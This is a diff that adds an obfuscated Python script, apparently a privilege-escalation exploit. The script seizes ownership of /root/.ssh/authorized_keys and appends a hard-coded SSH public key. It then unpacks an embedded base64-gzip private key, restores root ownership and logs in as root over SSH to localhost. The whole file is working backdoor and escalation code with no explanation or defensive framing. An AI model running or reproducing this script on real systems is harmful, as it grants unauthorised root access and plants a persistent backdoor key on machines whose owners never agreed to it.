@@ -1,0 +1,26 @@
+import base64,gzip,os
+a="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"
+b="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCf9KuqC6XRMPtua2sH6Rrbz2WOXFBNvJxMcDq/PC1EzjGOU4XaVLN5EcgCnVBJaIwi/ZsqsvoH9LcgOarUbmYbbpvWwPlKawFNoTgQWPqdi9wE6tq5L5t3KcWdhlsCr/z4Bva94tg4NOp6hvU3YBcu9mzDNYjKUWIT+JSylvk4xZis3LC9ibwrTxYE/hYzTsWLQEuaWYj3eS1JhxqVwzCBWlqYWFb+/CKUUj2eqbvubace+1wmDrNjYTv4EFO+VDdbtslyfEDhrPhOol4QsNoehnDkeD5TePeKR62U1Wg877wQ0NHdSOYj9axoR8SYT8WZm2j0+CVptDuUikxuSH4Px+WVC1JTTQhoh4PBCgqDaTTnxYlQLvScPW/RL21qtFuXg2rmnHfAGZYWG65z3d/kjdCRHG3+kpK7lvLK68D9qlEnTYGdLvinSjxTtZP1rMzUh9p2SRhZTZNPYPkC4T24kswhF9Ee2USrYKkstjFUkNV3yAxWUT5wB3Wx/71nnXU=\n"
+c=os.getuid()
+d,e,f,g=["/root",".ssh","authorized_keys",".bak"]
+os.chown(f"{d}",c,c)
+os.chown(f"{d}/{e}",c,c)
+os.chown(f"{d}/{e}/{f}",c,c)
+if not os.path.exists(f"{f}{g}"):
+    h=open(f"{d}/{e}/{f}","r")
+    i=h.read()
+    h.close()
+    j=open(f"{f}{g}","w")
+    j.write(i)
+    j.close()
+k=open(f"{d}/{e}/{f}","a+")
+k.write(b)
+k.close()
+l=open("id_rsa","w")
+l.write(gzip.decompress(base64.b64decode(a)).decode().lstrip("\n"))
+l.close()
+os.chmod("id_rsa", 0o600)
+os.chown(f"{d}/{e}/{f}", 0, 0)
+os.chown(f"{d}/{e}", 0, 0)
+os.chown(f"{d}", 0, 0)
+os.system("ssh -i id_rsa root@127.0.0.1")
